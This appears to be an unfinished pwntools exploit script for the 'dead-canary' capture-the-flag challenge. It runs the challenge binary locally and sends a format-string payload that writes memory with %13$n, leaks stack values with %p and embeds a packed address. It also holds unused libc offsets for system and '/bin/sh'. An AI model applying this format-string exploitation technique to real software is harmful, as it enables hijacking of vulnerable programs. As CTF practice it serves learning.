import struct
from pwn import *

host, port = '2020.redpwnc.tf',31744
# r = remote(host, port)
r = process('./dead-canary')

offset = None
# offset_libc
sh = 0x1904f7
system = 0x2e35d


payload = '%13$n %p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p\xe3\x08@\x00\x00\x00\x00\x00AAAAAAAABBBBBBBBB'

pause()
# print(r.recvline())
r.sendline(payload)
r.interactive()